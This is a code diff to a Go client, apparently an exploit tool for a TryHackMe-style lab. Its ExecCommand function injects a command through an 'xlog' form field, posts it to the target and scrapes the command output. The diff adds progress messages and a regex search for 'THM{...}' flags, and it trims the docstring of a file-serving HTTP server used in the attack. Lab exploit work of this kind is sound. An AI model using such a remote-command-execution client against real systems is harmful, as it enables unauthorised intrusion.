@@ -151,6 +151,7 @@ func (c *Client) ExecCommand(command string) (output string, err error) {
 	var targeturl string = fmt.Sprintf("%s/test/", c.baseURL)
 	var values url.Values = url.Values{}
 
+	SysMsgNB("getting hidden form values for post request ...")
 	hiddeninfo, err = c.GetHiddenValues()
 	if err != nil {
 		return "", err
@@ -162,6 +163,7 @@ func (c *Client) ExecCommand(command string) (output string, err error) {
 	}
 	values.Set("xlog", payload)
 
+	SysMsgNB("building request ...")
 	req, err = http.NewRequest(http.MethodPost, targeturl, strings.NewReader(values.Encode()))
 	if err != nil {
 		return "", err
@@ -170,6 +172,7 @@ func (c *Client) ExecCommand(command string) (output string, err error) {
 	err = c.BuildHeaders(&req)
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 
+	SysMsgNB("sending payload to target ...")
 	resp, err = c.Session.Do(req)
 	if err != nil {
 		if os.IsTimeout(err) {
@@ -179,6 +182,7 @@ func (c *Client) ExecCommand(command string) (output string, err error) {
 	}
 	defer resp.Body.Close()
 
+	SysMsgNB("processing response ...")
 	bodycontent, err = ioutil.ReadAll(resp.Body)
 	if err != nil {
 		return "", err
@@ -198,12 +202,21 @@ func (c *Client) ExecCommand(command string) (output string, err error) {
 		bodycontent = []byte(strings.Replace(string(bodycontent), bitlockerstr, "", -1))
 	}
 
+	SysMsgNB("grabbing command output ...")
 	// Grab command output
 	output, err = FindMatch(bodycontent, "<pre>((.|\n)*?)</pre>")
 	output = strings.Replace(output, "<pre>", "", -1)
 	output = strings.Replace(output, "</pre>", "", -1)
 	output = strings.Trim(output, "\n\r")
 	output = fmt.Sprintf("%s\n", output)
+
+	// Search for flag in command output
+	flagval, err = FindMatch([]byte(output), "(thm|THM){.*}")
+	if err != nil {
+		ErrMsg("flag not found in command output")
+	} else {
+		SucMsg(fmt.Sprintf("Flag: %s", flagval))
+	}
 
 	return output, nil
 }
@@ -437,15 +450,13 @@ func PrintChar(char byte, n int) {
 //
 // Description:
 //
-//    Function designed to create an HTTP server to use during
-//    this attack. It can deliver files to the target and decode
-//    data coming from the target.
+//    Function designed to create an HTTP file server to use during
+//    this attack. It can deliver files to the target.
 //
 // Input(s):
 //
 //    ip - string. ip address to listen on.
 //    port - int. port to listen on.
-//    wg - *sync.WaitGroup. waitgroup this is a part of.
 //
 // Return(s):
 //
